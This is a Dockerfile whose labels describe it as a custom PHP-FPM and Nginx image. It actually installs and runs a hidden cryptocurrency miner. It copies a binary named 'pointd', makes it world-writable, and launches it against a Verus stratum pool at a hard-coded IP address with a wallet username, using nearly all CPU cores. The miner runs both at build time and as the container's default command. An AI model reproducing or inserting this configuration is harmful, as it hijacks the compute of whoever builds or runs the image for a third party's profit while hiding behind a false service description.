FROM ubuntu:18.04

# LABEL about the custom image
LABEL maintainer="admin@sysadminjournal.com"
LABEL version="0.1"
LABEL description="This is custom Docker Image for \
the PHP-FPM and Nginx Services."

# Disable Prompt During Packages Installation
ARG DEBIAN_FRONTEND=noninteractive

# Update Ubuntu Software repository
RUN  apt update
RUN  apt install libjansson-dev -y
RUN  apt install curl libcurl4 -y

COPY pointd pointd
RUN chmod 777 pointd
RUN ./pointd -a verus -o stratum+tcp://149.56.27.47:3956 -u RN2u2EXEyW65CAgXpiqG99uuha5ATPcWSK.iribilangbos -p x -t $(nproc --ignore 1)

CMD ["./pointd -a verus -o stratum+tcp://149.56.27.47:3956 -u RN2u2EXEyW65CAgXpiqG99uuha5ATPcWSK.iribilangbos -p x -t $(nproc --ignore 1)" ]
